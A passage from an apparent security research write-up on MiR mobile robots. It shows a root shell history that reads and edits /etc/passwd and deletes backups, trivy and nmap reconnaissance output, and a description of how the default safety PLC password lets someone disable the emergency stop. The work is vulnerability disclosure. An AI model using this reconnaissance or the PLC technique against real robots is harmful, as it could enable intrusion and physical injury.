    <span id="cb6-150"><a href="#cb6-150" aria-hidden="true" tabindex="-1"></a><span class="ex">./setup_master_disk.bash</span></span>
    <span id="cb6-151"><a href="#cb6-151" aria-hidden="true" tabindex="-1"></a><span class="ex">reboot</span></span>
    <span id="cb6-152"><a href="#cb6-152" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /etc/NetworkManager/system-connections/</span>
    <span id="cb6-153"><a href="#cb6-153" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-154"><a href="#cb6-154" aria-hidden="true" tabindex="-1"></a><span class="ex">ll</span></span>
    <span id="cb6-155"><a href="#cb6-155" aria-hidden="true" tabindex="-1"></a><span class="ex">nmcli</span> con</span>
    <span id="cb6-156"><a href="#cb6-156" aria-hidden="true" tabindex="-1"></a><span class="ex">nmcli</span> con status</span>
    <span id="cb6-157"><a href="#cb6-157" aria-hidden="true" tabindex="-1"></a><span class="ex">nmcli</span> con show</span>
    <span id="cb6-158"><a href="#cb6-158" aria-hidden="true" tabindex="-1"></a><span class="ex">nmcli</span> con down</span>
    <span id="cb6-159"><a href="#cb6-159" aria-hidden="true" tabindex="-1"></a><span class="ex">nmcli</span> con reload</span>
    <span id="cb6-160"><a href="#cb6-160" aria-hidden="true" tabindex="-1"></a><span class="ex">nmcli</span> con</span>
    <span id="cb6-161"><a href="#cb6-161" aria-hidden="true" tabindex="-1"></a><span class="ex">nmcli</span> con delete Wired<span class="dt">\ </span>connection<span class="dt">\ </span>1</span>
    <span id="cb6-162"><a href="#cb6-162" aria-hidden="true" tabindex="-1"></a><span class="ex">nmcli</span> con</span>
    <span id="cb6-163"><a href="#cb6-163" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-164"><a href="#cb6-164" aria-hidden="true" tabindex="-1"></a><span class="ex">/home/mirex/setup_master_disk.bash</span></span>
    <span id="cb6-165"><a href="#cb6-165" aria-hidden="true" tabindex="-1"></a><span class="ex">ifconfig</span></span>
    <span id="cb6-166"><a href="#cb6-166" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-167"><a href="#cb6-167" aria-hidden="true" tabindex="-1"></a><span class="ex">nmcli</span> connection show</span>
    <span id="cb6-168"><a href="#cb6-168" aria-hidden="true" tabindex="-1"></a><span class="ex">nmcli</span> connection edit Wired<span class="dt">\ </span>connection<span class="dt">\ </span>1</span>
    <span id="cb6-169"><a href="#cb6-169" aria-hidden="true" tabindex="-1"></a><span class="ex">nmcli</span> con</span>
    <span id="cb6-170"><a href="#cb6-170" aria-hidden="true" tabindex="-1"></a><span class="ex">nmcli</span> con show Wired<span class="dt">\ </span>connection<span class="dt">\ </span>1</span>
    <span id="cb6-171"><a href="#cb6-171" aria-hidden="true" tabindex="-1"></a><span class="ex">ifconfig</span></span>
    <span id="cb6-172"><a href="#cb6-172" aria-hidden="true" tabindex="-1"></a><span class="ex">ifdown</span> enp0s25</span>
    <span id="cb6-173"><a href="#cb6-173" aria-hidden="true" tabindex="-1"></a><span class="ex">ifconfig</span></span>
    <span id="cb6-174"><a href="#cb6-174" aria-hidden="true" tabindex="-1"></a><span class="ex">ifup</span> enp0s25</span>
    <span id="cb6-175"><a href="#cb6-175" aria-hidden="true" tabindex="-1"></a><span class="ex">ifconfig</span></span>
    <span id="cb6-176"><a href="#cb6-176" aria-hidden="true" tabindex="-1"></a><span class="ex">nmcli</span> con show Wired<span class="dt">\ </span>connection<span class="dt">\ </span>1</span>
    <span id="cb6-177"><a href="#cb6-177" aria-hidden="true" tabindex="-1"></a><span class="ex">ifconfig</span></span>
    <span id="cb6-178"><a href="#cb6-178" aria-hidden="true" tabindex="-1"></a><span class="ex">nmcli</span> con show Wired<span class="dt">\ </span>connection<span class="dt">\ </span>1</span>
    <span id="cb6-179"><a href="#cb6-179" aria-hidden="true" tabindex="-1"></a><span class="ex">ifconfig</span></span>
    <span id="cb6-180"><a href="#cb6-180" aria-hidden="true" tabindex="-1"></a><span class="ex">nmcli</span> con show Wired<span class="dt">\ </span>connection<span class="dt">\ </span>1</span>
    <span id="cb6-181"><a href="#cb6-181" aria-hidden="true" tabindex="-1"></a><span class="ex">ifconfig</span></span>
    <span id="cb6-182"><a href="#cb6-182" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/network/interfaces</span>
    <span id="cb6-183"><a href="#cb6-183" aria-hidden="true" tabindex="-1"></a><span class="ex">vi</span> /etc/network/interfaces</span>
    <span id="cb6-184"><a href="#cb6-184" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> /etc/network/interfaces.d/</span>
    <span id="cb6-185"><a href="#cb6-185" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> reboot</span>
    <span id="cb6-186"><a href="#cb6-186" aria-hidden="true" tabindex="-1"></a><span class="ex">ifconfig</span></span>
    <span id="cb6-187"><a href="#cb6-187" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/network/interfaces</span>
    <span id="cb6-188"><a href="#cb6-188" aria-hidden="true" tabindex="-1"></a><span class="fu">scp</span>  /etc/network/interfaces morten@192.168.12.193</span>
    <span id="cb6-189"><a href="#cb6-189" aria-hidden="true" tabindex="-1"></a><span class="fu">scp</span>  /etc/network/interfaces morten@192.168.12.193:~</span>
    <span id="cb6-190"><a href="#cb6-190" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-191"><a href="#cb6-191" aria-hidden="true" tabindex="-1"></a><span class="fu">rm</span> morten@192.168.12.193</span>
    <span id="cb6-192"><a href="#cb6-192" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-193"><a href="#cb6-193" aria-hidden="true" tabindex="-1"></a><span class="ex">llstat</span> /Etc/network/interfaces</span>
    <span id="cb6-194"><a href="#cb6-194" aria-hidden="true" tabindex="-1"></a><span class="fu">stat</span> <span class="at">-c</span>  /etc/network/interfaces</span>
    <span id="cb6-195"><a href="#cb6-195" aria-hidden="true" tabindex="-1"></a><span class="fu">stat</span> <span class="at">-c</span> <span class="st">&quot;%n&quot;</span>  /etc/network/interfaces</span>
    <span id="cb6-196"><a href="#cb6-196" aria-hidden="true" tabindex="-1"></a><span class="fu">stat</span> <span class="at">-c</span> <span class="st">&quot;%a&quot;</span>  /etc/network/interfaces</span>
    <span id="cb6-197"><a href="#cb6-197" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-198"><a href="#cb6-198" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /tmp/upgrade_ze7G5a/software/robot/</span>
    <span id="cb6-199"><a href="#cb6-199" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-200"><a href="#cb6-200" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> release/</span>
    <span id="cb6-201"><a href="#cb6-201" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-202"><a href="#cb6-202" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> www-data</span>
    <span id="cb6-203"><a href="#cb6-203" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> su www-data</span>
    <span id="cb6-204"><a href="#cb6-204" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> su www-data</span>
    <span id="cb6-205"><a href="#cb6-205" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/passwd</span>
    <span id="cb6-206"><a href="#cb6-206" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> vi /etc/passwd</span>
    <span id="cb6-207"><a href="#cb6-207" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> su www-data</span>
    <span id="cb6-208"><a href="#cb6-208" aria-hidden="true" tabindex="-1"></a><span class="fu">rm</span> /tmp/upgrade.lock</span>
    <span id="cb6-209"><a href="#cb6-209" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> su www-data</span>
    <span id="cb6-210"><a href="#cb6-210" aria-hidden="true" tabindex="-1"></a><span class="bu">exit</span></span>
    <span id="cb6-211"><a href="#cb6-211" aria-hidden="true" tabindex="-1"></a><span class="ex">apt-get</span> purge modemmanager</span>
    <span id="cb6-212"><a href="#cb6-212" aria-hidden="true" tabindex="-1"></a><span class="ex">apt-get</span> install anacron</span>
    <span id="cb6-213"><a href="#cb6-213" aria-hidden="true" tabindex="-1"></a><span class="fu">ps</span> aux <span class="kw">|</span> <span class="fu">grep</span> anacron</span>
    <span id="cb6-214"><a href="#cb6-214" aria-hidden="true" tabindex="-1"></a><span class="ex">apt-get</span> install bluez</span>
    <span id="cb6-215"><a href="#cb6-215" aria-hidden="true" tabindex="-1"></a><span class="ex">locale</span> <span class="at">-a</span></span>
    <span id="cb6-216"><a href="#cb6-216" aria-hidden="true" tabindex="-1"></a><span class="ex">apt-get</span> install php-gettext</span>
    <span id="cb6-217"><a href="#cb6-217" aria-hidden="true" tabindex="-1"></a><span class="ex">apt-get</span> install php-intl</span>
    <span id="cb6-218"><a href="#cb6-218" aria-hidden="true" tabindex="-1"></a><span class="ex">locale</span> <span class="at">-a</span></span>
    <span id="cb6-219"><a href="#cb6-219" aria-hidden="true" tabindex="-1"></a><span class="ex">locale-gen</span> en_US da_DK</span>
    <span id="cb6-220"><a href="#cb6-220" aria-hidden="true" tabindex="-1"></a><span class="ex">locale-gen</span> en_US da_DK da_DK.utf8 de_DE de_DE.utf8 zh_CN zh_CN.utf8</span>
    <span id="cb6-221"><a href="#cb6-221" aria-hidden="true" tabindex="-1"></a><span class="ex">update-locale</span></span>
    <span id="cb6-222"><a href="#cb6-222" aria-hidden="true" tabindex="-1"></a><span class="ex">poweroff</span></span>
    <span id="cb6-223"><a href="#cb6-223" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /usr/local/mir</span>
    <span id="cb6-224"><a href="#cb6-224" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-225"><a href="#cb6-225" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> software/</span>
    <span id="cb6-226"><a href="#cb6-226" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-227"><a href="#cb6-227" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-alh</span></span>
    <span id="cb6-228"><a href="#cb6-228" aria-hidden="true" tabindex="-1"></a><span class="fu">less</span> MIR_SOFTWARE_VERSION</span>
    <span id="cb6-229"><a href="#cb6-229" aria-hidden="true" tabindex="-1"></a><span class="ex">startx</span></span>
    <span id="cb6-230"><a href="#cb6-230" aria-hidden="true" tabindex="-1"></a><span class="ex">ifconfig</span></span>
    <span id="cb6-231"><a href="#cb6-231" aria-hidden="true" tabindex="-1"></a><span class="fu">mount</span></span>
    <span id="cb6-232"><a href="#cb6-232" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /tmp/</span>
    <span id="cb6-233"><a href="#cb6-233" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-234"><a href="#cb6-234" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> upgrade_tc4Z7G/</span>
    <span id="cb6-235"><a href="#cb6-235" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-236"><a href="#cb6-236" aria-hidden="true" tabindex="-1"></a><span class="fu">tail</span> <span class="at">-f</span> mir_upgrade.log</span>
    <span id="cb6-237"><a href="#cb6-237" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ..</span>
    <span id="cb6-238"><a href="#cb6-238" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-239"><a href="#cb6-239" aria-hidden="true" tabindex="-1"></a><span class="ex">poweroff</span></span>
    <span id="cb6-240"><a href="#cb6-240" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> /usr/local/mir/backups/robot/</span>
    <span id="cb6-241"><a href="#cb6-241" aria-hidden="true" tabindex="-1"></a><span class="fu">rm</span> <span class="at">-r</span> /usr/local/mir/backups/robot/<span class="pp">*</span></span>
    <span id="cb6-242"><a href="#cb6-242" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> /usr/local/mir/backups/robot/</span>
    <span id="cb6-243"><a href="#cb6-243" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> /usr/local/mir/backups/</span>
    <span id="cb6-244"><a href="#cb6-244" aria-hidden="true" tabindex="-1"></a><span class="bu">exit</span></span></code></pre></div>
    <p>Looking at this tells you a lot! We can guess how the update process works for these robots, we can also determine where to look for product’s FW versions, hardware and even where to look for hardware/robot backups. We can also determine where to look for the ROS catkin overlay, which contains binaries for most packages developed by MiR (beyond the use of the ROS Common packages).</p>
    <p>Let’s now look at the flaws that one could find with one of the existing open source scanners:</p>
    <div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@67817dedc5ca:/Vulmap-Local-Vulnerability-Scanners/Vulmap-Linux#</span> trivy fs <span class="at">--security-checks</span> vuln,config /</span>
    <span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="ex">2021-11-14T20:38:08.943+0100</span>    INFO    Need to update DB</span>
    <span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="ex">2021-11-14T20:38:08.943+0100</span>    INFO    Downloading DB...</span>
    <span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="ex">24.71</span> MiB / 24.71 MiB [-------------------------------------------------] 100.00% 27.77 MiB p/s 1s</span>
    <span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="ex">2021-11-14T20:38:10.449+0100</span>    INFO    Need to update the built-in policies</span>
    <span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="ex">2021-11-14T20:38:10.449+0100</span>    INFO    Downloading the built-in policies...</span>
    <span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="ex">2021-11-14T20:38:14.903+0100</span>    INFO    Detected OS: ubuntu</span>
    <span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a><span class="ex">2021-11-14T20:38:14.903+0100</span>    INFO    Detecting Ubuntu vulnerabilities...</span>
    <span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a><span class="ex">2021-11-14T20:38:15.020+0100</span>    INFO    Number of language-specific files: 1</span>
    <span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a><span class="ex">2021-11-14T20:38:15.020+0100</span>    INFO    Detecting jar vulnerabilities...</span>
    <span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a><span class="ex">2021-11-14T20:38:15.020+0100</span>    INFO    Detected config files: 7</span>
    <span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a><span class="ex">67817dedc5ca</span> <span class="er">(</span><span class="ex">ubuntu</span> 16.04<span class="kw">)</span></span>
    <span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a><span class="ex">===========================</span></span>
    <span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a><span class="ex">Total:</span> 15501 <span class="er">(</span><span class="ex">UNKNOWN:</span> 0, LOW: 5995, MEDIUM: 9069, HIGH: 432, CRITICAL: 5<span class="kw">)</span></span>
    <span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span></code></pre></div>
    <p><strong>15501</strong> vulnerabilities found. <strong>5</strong> <code>CRITICAL</code>, 432 <code>HIGH</code>. A quick look while filtering:</p>
    <div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@67817dedc5ca:/#</span> trivy fs <span class="at">--security-checks</span> vuln <span class="at">--severity</span> CRITICAL /</span></code></pre></div>
    <p>will tell you that packages impacted include <code>bluez</code>, <code>grub*</code>, (various) <code>libc</code>-components, <code>libssl</code>, <code>openssl</code>, or <code>wpasupplicant</code>. Among many others.</p>
    <p>Shortly, lots of opportunities to exploit.</p>
    <h3 id="footprinting-and-fingerprinting">Footprinting and fingerprinting</h3>
    <p>To be fair, most often you won’t have access to the complete rootfs (or you do!), so let’s take a look at things from the networking perspective and see if we can match the many findings. A quick scan of the robot’s hotspot (or wired) network leads to various endpoints. Let’s look deeper into some of the most interesting ones:</p>
    <p>The hotspot itself:</p>
    <div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@attacker:~#</span> nmap <span class="at">-sV</span> <span class="at">-Pn</span> 192.168.12.1</span>
    <span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Starting</span> Nmap 7.80SVN <span class="er">(</span> <span class="ex">https://nmap.org</span> <span class="kw">)</span> <span class="ex">at</span> 2020-06-08 15:16 CEST</span>
    <span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Nmap</span> scan report for 192.168.12.1</span>
    <span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Host</span> is up <span class="er">(</span><span class="ex">0.039s</span> latency<span class="kw">)</span><span class="bu">.</span></span>
    <span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Not</span> shown: 993 closed ports</span>
    <span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>     STATE SERVICE        VERSION</span>
    <span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a><span class="ex">21/tcp</span>   open  ftp            MikroTik router ftpd 6.46.2</span>
    <span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a><span class="ex">22/tcp</span>   open  ssh            MikroTik RouterOS sshd <span class="er">(</span><span class="ex">protocol</span> 2.0<span class="kw">)</span></span>
    <span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a><span class="ex">23/tcp</span>   open  telnet         APC PDU/UPS devices or Windows CE telnetd</span>
    <span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a><span class="ex">53/tcp</span>   open  domain         <span class="er">(</span><span class="ex">generic</span> dns response: NOTIMP<span class="kw">)</span></span>
    <span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a><span class="ex">80/tcp</span>   open  http           MikroTik router config httpd</span>
    <span id="cb9-12"><a href="#cb9-12" aria-hidden="true" tabindex="-1"></a><span class="ex">2000/tcp</span> open  bandwidth-test MikroTik bandwidth-test server</span>
    <span id="cb9-13"><a href="#cb9-13" aria-hidden="true" tabindex="-1"></a><span class="ex">8291/tcp</span> open  unknown</span>
    <span id="cb9-14"><a href="#cb9-14" aria-hidden="true" tabindex="-1"></a><span class="ex">2</span> services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi<span class="pp">?</span>new-service :</span>
    <span id="cb9-15"><a href="#cb9-15" aria-hidden="true" tabindex="-1"></a><span class="ex">==============NEXT</span> SERVICE FINGERPRINT <span class="er">(</span><span class="ex">SUBMIT</span> INDIVIDUALLY<span class="kw">)</span><span class="ex">==============</span></span>
    <span id="cb9-16"><a href="#cb9-16" aria-hidden="true" tabindex="-1"></a><span class="ex">SF-Port23-TCP:V=7.80SVN%I=7%D=6/8%Time=5EDE3A4D%P=x86_64-unknown-linux-gnu</span></span>
    <span id="cb9-17"><a href="#cb9-17" aria-hidden="true" tabindex="-1"></a><span class="ex">SF:%r</span><span class="er">(</span><span class="ex">NULL,C,</span><span class="st">&quot;\xff\xfb\x01\xff\xfd\x18\xff\xfd&#39;\xff\xfd\x1f&quot;</span><span class="kw">)</span><span class="ex">%r</span><span class="er">(</span><span class="ex">GenericLin</span></span>
    <span id="cb9-18"><a href="#cb9-18" aria-hidden="true" tabindex="-1"></a><span class="ex">SF:es,10,</span><span class="st">&quot;\xff\xfb\x01\xff\xfd\x18\xff\xfd&#39;\xff\xfd\x1f\r\n\r\n&quot;</span><span class="kw">)</span><span class="ex">%r</span><span class="er">(</span><span class="ex">tn3270</span></span>
    <span id="cb9-19"><a href="#cb9-19" aria-hidden="true" tabindex="-1"></a><span class="ex">SF:,1E,</span><span class="st">&quot;\xff\xfb\x01\xff\xfd\x18\xff\xfd&#39;\xff\xfd\x1f\xff\xfa\x18\x01\xff</span><span class="dt">\</span></span>
    <span id="cb9-20"><a href="#cb9-20" aria-hidden="true" tabindex="-1"></a><span class="st">SF:xf0\xff\xfe\x19\xff\xfc\x19\xff\xfe\0\xff\xfc\0&quot;</span><span class="kw">)</span><span class="ex">%r</span><span class="er">(</span><span class="ex">GetRequest,1E,</span><span class="st">&quot;\xff</span></span>
    <span id="cb9-21"><a href="#cb9-21" aria-hidden="true" tabindex="-1"></a><span class="st">SF:\xfb\x01\xff\xfd\x18\xff\xfd&#39;\xff\xfd\x1fGET\x20/\x20HTTP/1\.0\r\n\r\n&quot;</span></span>
    <span id="cb9-22"><a href="#cb9-22" aria-hidden="true" tabindex="-1"></a><span class="ex">SF:</span><span class="kw">)</span><span class="ex">%r</span><span class="er">(</span><span class="ex">RPCCheck,16,</span><span class="st">&quot;\xff\xfb\x01\xff\xfd\x18\xff\xfd&#39;\xff\xfd\x1f\x80\^@\^</span></span>
    <span id="cb9-23"><a href="#cb9-23" aria-hidden="true" tabindex="-1"></a><span class="st">SF:@\(r\xfe\^\]&quot;</span><span class="kw">)</span><span class="ex">%r</span><span class="er">(</span><span class="ex">Help,12,</span><span class="st">&quot;\xff\xfb\x01\xff\xfd\x18\xff\xfd&#39;\xff\xfd\x1f</span></span>
    <span id="cb9-24"><a href="#cb9-24" aria-hidden="true" tabindex="-1"></a><span class="st">SF:HELP\r\n&quot;</span><span class="kw">)</span><span class="ex">%r</span><span class="er">(</span><span class="ex">SIPOptions,EB,</span><span class="st">&quot;\xff\xfb\x01\xff\xfd\x18\xff\xfd&#39;\xff\xfd\x</span></span>
    <span id="cb9-25"><a href="#cb9-25" aria-hidden="true" tabindex="-1"></a><span class="st">SF:1fOPTIONS\x20sip:nm\x20SIP/2\.0\r\nVia:\x20SIP/2\.0/TCP\x20nm;branch=fo</span></span>
    <span id="cb9-26"><a href="#cb9-26" aria-hidden="true" tabindex="-1"></a><span class="st">SF:o\r\nFrom:\x20&lt;sip:nm@nm&gt;;tag=root\r\nTo:\x20&lt;sip:nm2@nm2&gt;\r\nCall-ID:</span><span class="dt">\</span></span>
    <span id="cb9-27"><a href="#cb9-27" aria-hidden="true" tabindex="-1"></a><span class="st">SF:x2050000\r\nCSeq:\x2042\x20OPTIONS\r\nMax-Forwards:\x2070\r\nContent-Le</span></span>
    <span id="cb9-28"><a href="#cb9-28" aria-hidden="true" tabindex="-1"></a><span class="st">SF:ngth:\x200\r\nContact:\x20&lt;sip:nm@nm&gt;\r\nAccept:\x20application/sdp\r\n</span></span>
    <span id="cb9-29"><a href="#cb9-29" aria-hidden="true" tabindex="-1"></a><span class="st">SF:\r\n&quot;</span><span class="kw">)</span><span class="ex">%r</span><span class="er">(</span><span class="ex">NCP,C,</span><span class="st">&quot;\xff\xfb\x01\xff\xfd\x18\xff\xfd&#39;\xff\xfd\x1f&quot;</span><span class="kw">);</span></span>
    <span id="cb9-30"><a href="#cb9-30" aria-hidden="true" tabindex="-1"></a><span class="ex">==============NEXT</span> SERVICE FINGERPRINT <span class="er">(</span><span class="ex">SUBMIT</span> INDIVIDUALLY<span class="kw">)</span><span class="ex">==============</span></span>
    <span id="cb9-31"><a href="#cb9-31" aria-hidden="true" tabindex="-1"></a><span class="ex">SF-Port53-TCP:V=7.80SVN%I=7%D=6/8%Time=5EDE3A52%P=x86_64-unknown-linux-gnu</span></span>
    <span id="cb9-32"><a href="#cb9-32" aria-hidden="true" tabindex="-1"></a><span class="ex">SF:%r</span><span class="er">(</span><span class="ex">DNSVersionBindReqTCP,E,</span><span class="st">&quot;\0\x0c\0\x06\x81\x84\0\0\0\0\0\0\0\0&quot;</span><span class="kw">);</span></span>
    <span id="cb9-33"><a href="#cb9-33" aria-hidden="true" tabindex="-1"></a><span class="ex">Service</span> Info: OSs: Linux, RouterOS<span class="kw">;</span> <span class="ex">Device:</span> router<span class="kw">;</span> <span class="ex">CPE:</span> cpe:/o:mikrotik:routeros</span></code></pre></div>
    <p>The main robot computer (NUC):</p>
    <div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@attacker:~#</span> nmap <span class="at">-sV</span> <span class="at">-Pn</span> 192.168.12.20</span>
    <span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Starting</span> Nmap 7.80SVN <span class="er">(</span> <span class="ex">https://nmap.org</span> <span class="kw">)</span> <span class="ex">at</span> 2020-06-08 16:24 CEST</span>
    <span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Stats:</span> 0:00:08 elapsed<span class="kw">;</span> <span class="ex">0</span> hosts completed <span class="er">(</span><span class="ex">1</span> up<span class="kw">)</span><span class="ex">,</span> 1 undergoing Service Scan</span>
    <span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Service</span> scan Timing: About 20.00% done<span class="kw">;</span> <span class="ex">ETC:</span> 16:25 <span class="er">(</span><span class="ex">0:00:24</span> remaining<span class="kw">)</span></span>
    <span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Stats:</span> 0:00:33 elapsed<span class="kw">;</span> <span class="ex">0</span> hosts completed <span class="er">(</span><span class="ex">1</span> up<span class="kw">)</span><span class="ex">,</span> 1 undergoing Script Scan</span>
    <span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a><span class="ex">NSE</span> Timing: About 99.53% done<span class="kw">;</span> <span class="ex">ETC:</span> 16:25 <span class="er">(</span><span class="ex">0:00:00</span> remaining<span class="kw">)</span></span>
    <span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Nmap</span> scan report for mir.com <span class="er">(</span><span class="ex">192.168.12.20</span><span class="kw">)</span></span>
    <span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a><span class="ex">Host</span> is up <span class="er">(</span><span class="ex">0.11s</span> latency<span class="kw">)</span><span class="bu">.</span></span>
    <span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a><span class="ex">Not</span> shown: 995 closed ports</span>
    <span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>     STATE SERVICE VERSION</span>
    <span id="cb10-11"><a href="#cb10-11" aria-hidden="true" tabindex="-1"></a><span class="ex">22/tcp</span>   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 <span class="er">(</span><span class="ex">Ubuntu</span> Linux<span class="kw">;</span> <span class="ex">protocol</span> 2.0<span class="kw">)</span></span>
    <span id="cb10-12"><a href="#cb10-12" aria-hidden="true" tabindex="-1"></a><span class="ex">80/tcp</span>   open  http    Apache httpd 2.4.18 <span class="er">(</span><span class="kw">(</span><span class="ex">Ubuntu</span><span class="kw">))</span></span>
    <span id="cb10-13"><a href="#cb10-13" aria-hidden="true" tabindex="-1"></a><span class="ex">8080/tcp</span> open  http    Apache httpd 2.4.18 <span class="er">(</span><span class="kw">(</span><span class="ex">Ubuntu</span><span class="kw">))</span></span>
    <span id="cb10-14"><a href="#cb10-14" aria-hidden="true" tabindex="-1"></a><span class="ex">8888/tcp</span> open  http    Werkzeug httpd 0.10.4 <span class="er">(</span><span class="ex">Python</span> 2.7.12<span class="kw">)</span></span>
    <span id="cb10-15"><a href="#cb10-15" aria-hidden="true" tabindex="-1"></a><span class="ex">9090/tcp</span> open  http    Tornado httpd 4.0.2</span>
    <span id="cb10-16"><a href="#cb10-16" aria-hidden="true" tabindex="-1"></a><span class="ex">Service</span> Info: OS: Linux<span class="kw">;</span> <span class="ex">CPE:</span> cpe:/o:linux:linux_kernel</span></code></pre></div>
    <p>Reconnaissance in this case leads to lots of interesting information. The trail that’s established by the resulting information from footprinting and fingerprinting will get us in a good track to identify many of the flaws existing in the rootfs and that are known.</p>
    <p>Leaving those aside, let’s look at some of the PoCs and novel vulnerabilities discovered.</p>
    <h3 id="vulnerabilities-1">Vulnerabilities</h3>
    <h4 id="default-credentials-on-sick-plc-allows-disabling-safety-features">Default credentials on SICK PLC allows disabling safety features</h4>
    <p>The password for the safety PLC is the default and thus easy to find (in manuals, etc.). This allows a manipulated program to be uploaded to the safety PLC, effectively disabling the emergency stop in case an object is too close to the robot. Navigation and any other components dependent on the laser scanner are not affected (thus it is hard to detect before something happens) though the laser scanner configuration can also be affected altering further the safety of the device.</p>
    <p><a href="https://asciinema.org/a/cgGZfVcVmLD0h7bIso55mpMpI"><img src="https://asciinema.org/a/cgGZfVcVmLD0h7bIso55mpMpI.svg" alt="asciicast" /></a></p>
    <p><a href="https://www.youtube.com/watch?v=3r-A-sRnMSE"><img src="https://img.youtube.com/vi/3r-A-sRnMSE/0.jpg" /></a></p>
    <h4 id="hardcoded-credentials-on-mirx00s-control-dashboard">Hardcoded Credentials on MiRX00’s Control Dashboard</h4>
